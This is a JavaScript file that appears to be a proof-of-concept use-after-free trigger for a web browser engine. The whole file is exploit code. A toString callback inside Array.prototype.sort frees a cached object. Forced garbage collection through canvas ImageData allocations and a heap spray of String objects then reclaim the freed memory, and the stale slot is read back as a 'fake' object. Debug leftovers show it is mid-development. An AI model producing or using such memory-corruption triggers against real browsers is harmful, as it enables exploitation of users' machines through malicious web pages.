function uaf(){
    function uaf_gc() {
        try {
            var c = document.createElement("canvas");
            var gl = c.getContext("2d");

            for (var i = 0; i < 0x100; i++) {
                var gggg = gl.createImageData(1, 0x100000)
                var oooo = document.createElement('button')
            }
        } catch (e) {

        }
    }
    function sleep(d){
      for(var t = Date.now();Date.now() - t <= d;);
    }

    //alert(111);
    document.body.offsetParent

        var c = document.createElement('canvas')
        var gl = c.getContext('2d')

    var pad = new Array(0x1000)
    for (var i = pad.length - 1; i >= 0; i--) {
        pad[i] = [7,8,9]
    }
    var c = new Array(0x10000)
    var cache = new Array(0x100)
    for (var i = cache.length - 1; i >= 0; i--) {
        cache[i] = {'a':1, 'b':2, 'c':3}
    }
    var b = {'a':1, 'b':2, 'c':3}
    //breaksee(cache[0x50])
    //breaksee(c)
    var a = [cache[0x50],{toString:function(){
     a[0] = {};
     cache[0x50] = null
     uaf_gc();
     //}
     sleep(2000)
     //alert(123)
     for (var j=0; j < c.length; j++) {
        //pad[j].length = 0x100
    //c[j] = document.createElement('button')
    //c[j].a = 666
    //c[j] = gl.createImageData(1, (0x40-0x10)/4)//{'a':7, 'b':8, 'c':9}
    c[j] = new String('123456')//{'a':666, 'b':8, 'c':9}
    //c[j].toString = function(){alert('ok'); return '666'}
     }

     this.toString = null
     return "aaa";
    }}, 1]
    sleep(1000)
    //document.body.offsetParent;
    a.sort();
    var fake = a[1]
    alert(fake);
}
